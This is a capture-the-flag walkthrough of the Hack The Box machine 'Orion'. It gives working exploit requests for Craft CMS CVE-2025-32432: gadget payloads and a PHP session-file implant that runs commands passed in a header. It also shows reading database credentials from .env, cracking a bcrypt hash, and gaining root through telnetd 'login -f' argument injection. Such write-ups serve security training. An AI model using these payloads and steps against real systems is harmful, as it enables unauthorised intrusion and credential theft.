## Summary

Orion is an Easy Linux machine themed around the "Orion Telecom" company. Port 80 serves
a **Craft CMS 5.6.16** site on the `orion.htb` virtual host. That version is vulnerable to
**CVE-2025-32432**, a pre-authentication remote code execution flaw in the asset
image-transform endpoint (`actions/assets/generate-transform`). The endpoint performs
insecure object instantiation on the attacker-supplied `handle` parameter, giving an
arbitrary-class gadget primitive. A two-packet chain — implant a tiny PHP payload into the
on-disk PHP session file, then instantiate `yii\rbac\PhpManager` with its `itemFile`
pointing at that session file so Craft `require()`s it — yields **RCE as `www-data`**. The
Craft `.env` exposes the MySQL root password; the `users` table holds the admin
(`adam@orion.htb`) **bcrypt** hash, which cracks to `darkangel` and is reused as the
system password for user **adam** → SSH and the user flag. Privilege escalation abuses a
**custom root telnetd** bound to `127.0.0.1:23` (GNU inetutils, launched as root by
`inetd`). Because telnetd expands a `login_invocation` template and then splits the result
into `argv` on whitespace, a username containing a space injects extra arguments into the
`login` call: `telnet -l "-f root" localhost 23` becomes `login … -f root`, and `login -f`
is passwordless autologin → **root**.

## Machine Information

| Name | Difficulty | OS | Platform |
| --- | --- | --- | --- |
| Orion | Easy | Linux | Hack The Box |

## Attack Path

1. Nmap shows SSH (22) and HTTP (80); port 80 redirects to `http://orion.htb/`.
2. `orion.htb` is **Craft CMS 5.6.16** ("Orion Telecom"), with `CRAFT_DEV_MODE=true`.
3. Craft 5.6.16 is vulnerable to **CVE-2025-32432** (unauth RCE via `actions/assets/generate-transform`).
4. Leak `session.save_path` (`/var/lib/php/sessions`) and a valid `assetId` with the `GuzzleHttp\Psr7\FnStream`→`phpinfo` probe gadget.
5. Implant a space-free PHP payload into the PHP session file via `GET /index.php?p=admin/dashboard&a=<?=…?>`.
6. Trigger it with the `yii\rbac\PhpManager` gadget (`itemFile` = the session file) → **RCE as `www-data`**.
7. Read `/var/www/html/craft/.env` → MySQL `root:SuperSecureCraft123Pass!`.
8. Dump the `users` table → admin `adam@orion.htb`, bcrypt `$2y$13$…`.
9. Crack the hash with `john`/rockyou → **`darkangel`**; it is reused for the system user `adam`.
10. `ssh adam@orion` → `/home/adam/user.txt`.
11. Enumerate: a **custom telnetd runs as root** on `127.0.0.1:23`; `rlogin`/`rsh`/`rcp` are SUID root.
12. telnetd splits the expanded login command into `argv` on whitespace → argument injection.
13. `telnet -l "-f root" localhost 23` → `login … -f root` → passwordless root autologin → `/root/root.txt`.

## Reconnaissance

```bash
nmap -Pn -p- --min-rate 3000 -T4 10.129.43.217
nmap -Pn -sCV -p22,80 10.129.43.217
```

```
22/tcp open  ssh   OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu 22.04)
80/tcp open  http  nginx 1.18.0 (Ubuntu)   ->  redirects to http://orion.htb/
```

After adding `orion.htb` to `/etc/hosts`, the site identifies itself as Craft CMS:

```bash
curl -sI http://orion.htb/            # X-Powered-By: Craft CMS
curl -s  http://orion.htb/admin/login # Craft CMS 5.6.16, sets CRAFT_CSRF_TOKEN
```

## Foothold — CVE-2025-32432 (Craft CMS Pre-Auth RCE)

The image-transform action instantiates objects from the client-supplied `handle`
structure without validating the target class (`__class`). This is an arbitrary-object
instantiation primitive. Detection uses the `FnStream` gadget, whose `_fn_close` callable
is invoked on destruction — set to `phpinfo` it dumps the PHP configuration (confirming the
vulnerability and leaking `session.save_path` and `DOCUMENT_ROOT`):

```json
POST /index.php?p=admin/actions/assets/generate-transform
X-CSRF-Token: <token from /admin/dashboard>
Content-Type: application/json

{"assetId":1,"handle":{"width":123,"height":123,
  "as x":{"class":"craft\\behaviors\\FieldLayoutBehavior",
          "__class":"GuzzleHttp\\Psr7\\FnStream",
          "__construct()":[[]],"_fn_close":"phpinfo"}}}
```

`session.save_path` comes back as `/var/lib/php/sessions` (the Ubuntu default — public PoCs
that assume `/tmp` fail here). Full RCE is a two-packet chain:

**Packet 1 — implant PHP into the session file.** Craft persists request data into the PHP
session file on disk. A GET request stores a payload, and the CSRF token is parsed from the
*same* response (a second request would rewrite the session file and wipe the payload). The
payload must be **space-free** — spaces break the raw HTTP request line — so the command is
delivered later via a header:

```
GET /index.php?p=admin/dashboard&a=<?=exit(passthru($_SERVER['HTTP_X_CMD']))?>
```

**Packet 2 — execute it.** Instantiate `yii\rbac\PhpManager` with `itemFile` set to the
session file. `PhpManager` `require()`s that file, executing the implanted PHP. `exit()`
flushes the output buffer before the subsequent `PhpManager` exception, so the command
output is returned:

```json
POST /index.php?p=actions/assets/generate-transform
X-CSRF-Token: <token>
X-Cmd: echo S7ART;id;echo E7ND

{"assetId":1,"handle":{"width":1,"height":1,
  "as hack":{"class":"craft\\behaviors\\FieldLayoutBehavior",
             "__class":"yii\\rbac\\PhpManager",
             "__construct()":[{"itemFile":"/var/lib/php/sessions/sess_<CraftSessionId>"}]}}}
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)   # host: orion
```

## Pivot to adam — Cracked bcrypt, Reused Password

```bash
cat /var/www/html/craft/.env
# CRAFT_DB_USER=root
# CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!

mysql -uroot -pSuperSecureCraft123Pass! orion -e 'select username,email,password,admin from users;'
# admin | adam@orion.htb | $2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS | 1
```

The bcrypt hash cracks quickly against rockyou:

```bash
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# darkangel
```

`darkangel` is reused as the system password for `adam`:

```bash
ssh adam@10.129.43.217        # password: darkangel
id    # uid=1000(adam)
cat ~/user.txt
```

## Privilege Escalation — telnetd `login` Argument Injection

Local enumeration reveals a **root-owned telnetd on localhost** plus deliberately SUID
r-services:

```bash
grep telnet /etc/inetd.conf
# 127.0.0.1:telnet stream tcp nowait root /usr/local/sbin/telnetd telnetd

find / -perm -4000 -type f 2>/dev/null | grep -E 'rlogin|rsh|rcp'
# /usr/bin/rlogin  /usr/bin/rsh  /usr/bin/rcp   (SUID root)
```

`/usr/local/sbin/telnetd` → `/usr/libexec/telnetd` is GNU inetutils telnetd. It builds the
login command from a `login_invocation` template, *expands* it, and then splits the
resulting string into `argv` on whitespace. The connecting username (sent via the telnet
`ENVIRON`/`-l` option) is substituted into that command — so a **space in the username
injects additional `argv` tokens** into the `login` invocation.

`login -f <name>` performs authentication-free (passwordless) login. Supplying the username
`-f root` (with a space) expands to `login … -f root`:

```bash
telnet -l "-f root" localhost 23
# ...
# root@orion:~# id
# uid=0(root) gid=0(root) groups=0(root)
# root@orion:~# cat /root/root.txt
```

Non-interactively:

```bash
(sleep 2; echo id; sleep 1; echo 'cat /root/root.txt'; sleep 1; echo exit) \
  | telnet -l "-f root" localhost 23
```

The bundled form `-froot` (no space) is rejected because it lands in the *name* position and
`login` refuses a name starting with `-`; the injected **space** is what turns it into a
separate `-f` option.

## Vulnerability Analysis

- **CVE-2025-32432 (Craft CMS ≤ 5.6.16 / 4.x / 3.x):** the image-transform endpoint
  instantiates arbitrary classes from the client-controlled `handle` (`__class`), a
  Yii-container object-injection giving pre-auth RCE. `CRAFT_DEV_MODE=true` also leaks full
  paths in error pages.
- **Secret + weak password reuse:** the DB password sits in `.env`, and the admin bcrypt
  hash is a weak, crackable password reused for the interactive system account.
- **Root telnetd + `login` argument injection:** running a whitespace-split `login`
  invocation as root turns a controllable username into argument injection, and `login -f`
  is passwordless — an instant root autologin. The SUID r-services reinforce the same legacy
  attack surface.

## Tools Used

- `nmap` — port and service discovery
- `curl` / Python `requests` — CVE-2025-32432 exploitation (session implant + gadget trigger)
- `mysql` — Craft database inspection
- `john` — bcrypt cracking
- `ssh` — adam access
- `telnet` — `login -f root` argument-injection root autologin

## Key Takeaways

- Insecure object instantiation (`__class` into a Yii container) is a pre-auth RCE class —
  a single unvalidated parameter becomes an arbitrary-gadget primitive.
- When adapting a public PoC, verify environment assumptions: the PHP session path here is
  `/var/lib/php/sessions`, not `/tmp`, and the raw payload must be space-free to survive the
  HTTP request line.
- Cracked application password hashes are worth trying against system accounts — reuse
  bridged `www-data` → `adam` here.
- Any privileged program that builds a command string and re-splits it into `argv` is an
  argument-injection sink; with `login`, a space in a username plus `-f` is passwordless root.
